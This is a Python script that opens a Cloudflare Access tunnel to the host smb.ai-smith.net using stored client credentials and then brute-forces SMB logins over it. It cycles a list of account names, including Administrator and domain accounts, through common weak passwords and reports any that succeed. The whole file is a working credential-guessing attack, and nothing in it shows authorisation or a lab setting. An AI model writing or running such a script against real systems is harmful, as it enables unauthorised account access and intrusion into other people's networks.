import json
import subprocess
import time
import socket
import uuid
import sys

# Import smbprotocol manually or assume it's available
try:
    from smbprotocol.connection import Connection
    from smbprotocol.session import Session
    from smbprotocol.tree import TreeConnect
except ImportError:
    print("smbprotocol not found!")
    sys.exit(1)

LOCAL_PORT = 10445
TARGET_HOST = "127.0.0.1"

USERNAMES = [
    "melody",
    "kuro",
    "Administrator",
    "Guest",
    "meltat0\\melody",
    "meltat0\\kuro",
    "meltat0\\Administrator",
]
PASSWORDS = [
    "",
    "1121",
    "0114",
    "0441",
    "1234",
    "password",
    "melody",
    "kuro",
    "admin",
    "123456",
    "qwerty",
    "P@ssword1",
]


def try_login(username, password):
    print(f"Trying {username} / '{password}' ...")
    try:
        connection = Connection(uuid.uuid4(), TARGET_HOST, LOCAL_PORT)
        connection.connect()
        try:
            session = Session(connection, username, password)
            session.connect()
            print(f"[+] SUCCESS: Authenticated as {username}!")
            return True
        finally:
            connection.disconnect()
    except Exception as e:
        # print(f"    [-] Failed: {str(e)[:100]}...")
        pass
    return False


def main():
    # Load credentials
    try:
        with open("rdp_access_creds.json", "r") as f:
            creds = json.load(f)
    except FileNotFoundError:
        print("Credentials file not found!")
        return

    client_id = creds["client_id"]
    client_secret = creds["client_secret"]

    print(f"Starting tunnel for smb.ai-smith.net on port {LOCAL_PORT}...")

    cmd = [
        "cloudflared",
        "access",
        "tcp",
        "--hostname",
        "smb.ai-smith.net",
        "--url",
        f"localhost:{LOCAL_PORT}",
        "--id",
        client_id,
        "--secret",
        client_secret,
    ]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    try:
        print("Waiting 5s for tunnel...")
        time.sleep(5)

        # Verify port open
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if s.connect_ex((TARGET_HOST, LOCAL_PORT)) != 0:
            print("Tunnel failed to open port!")
            s.close()
            return
        s.close()
        print("Tunnel UP. Starting attack...")

        found = False
        for user in USERNAMES:
            for pwd in PASSWORDS:
                if try_login(user, pwd):
                    print(f"\n!!! FOUND VALID CREDENTIALS: {user} / {pwd} !!!")
                    found = True
                    # continue to find more

        if not found:
            print("\nAttack finished. No credentials found.")

    finally:
        print("Closing tunnel...")
        proc.terminate()


if __name__ == "__main__":
    main()
